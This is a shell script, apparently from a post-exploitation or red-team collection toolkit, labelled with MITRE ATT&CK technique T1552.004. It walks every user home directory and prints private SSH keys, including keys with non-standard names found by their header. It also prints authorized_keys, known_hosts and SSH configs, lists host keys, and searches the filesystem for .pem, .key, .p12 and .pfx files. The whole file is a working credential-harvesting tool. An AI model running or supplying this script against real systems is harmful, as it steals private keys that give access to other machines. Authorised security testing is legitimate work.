#!/bin/sh
# gather/linux/ssh-keys.sh — Collect SSH keys, authorized_keys, known_hosts
# Requires: read access to user home directories
# Read-only: YES
# MITRE ATT&CK: T1552.004 — Unsecured Credentials: Private Keys

echo "=== SSH DIRECTORIES ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -d "$d/.ssh" ] || continue
  echo "--- $d/.ssh ---"
  ls -la "$d/.ssh/" 2>/dev/null
done

echo ""
echo "=== PRIVATE KEYS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -d "$d/.ssh" ] || continue
  for key in id_rsa id_ed25519 id_ecdsa id_dsa; do
    [ -f "$d/.ssh/$key" ] || continue
    echo "--- $d/.ssh/$key ---"
    cat "$d/.ssh/$key" 2>/dev/null
  done
  # Non-standard key names
  find "$d/.ssh" -maxdepth 1 -type f ! -name "*.pub" ! -name "known_hosts*" ! -name "authorized_keys*" ! -name "config" ! -name "id_*" 2>/dev/null | while IFS= read -r f; do
    head -1 "$f" 2>/dev/null | grep -q "PRIVATE KEY" && echo "--- $f ---" && cat "$f"
  done
done

echo ""
echo "=== AUTHORIZED KEYS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.ssh/authorized_keys" ] || continue
  echo "--- $d/.ssh/authorized_keys ---"
  cat "$d/.ssh/authorized_keys" 2>/dev/null
done

echo ""
echo "=== SSH CONFIG ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.ssh/config" ] || continue
  echo "--- $d/.ssh/config ---"
  cat "$d/.ssh/config" 2>/dev/null
done

echo ""
echo "=== KNOWN HOSTS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.ssh/known_hosts" ] || continue
  echo "--- $d/.ssh/known_hosts ---"
  cat "$d/.ssh/known_hosts" 2>/dev/null
done

echo ""
echo "=== SYSTEM SSH KEYS ==="
ls -la /etc/ssh/ssh_host_* 2>/dev/null
echo "--- sshd_config auth settings ---"
grep -iE "^(AuthorizedKeysFile|PermitRootLogin|PasswordAuthentication|PubkeyAuthentication)" /etc/ssh/sshd_config 2>/dev/null

echo ""
echo "=== OTHER KEY FILES ==="
find / -maxdepth 4 \( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" \) 2>/dev/null | grep -v "/proc/" | grep -v "/sys/" | head -50
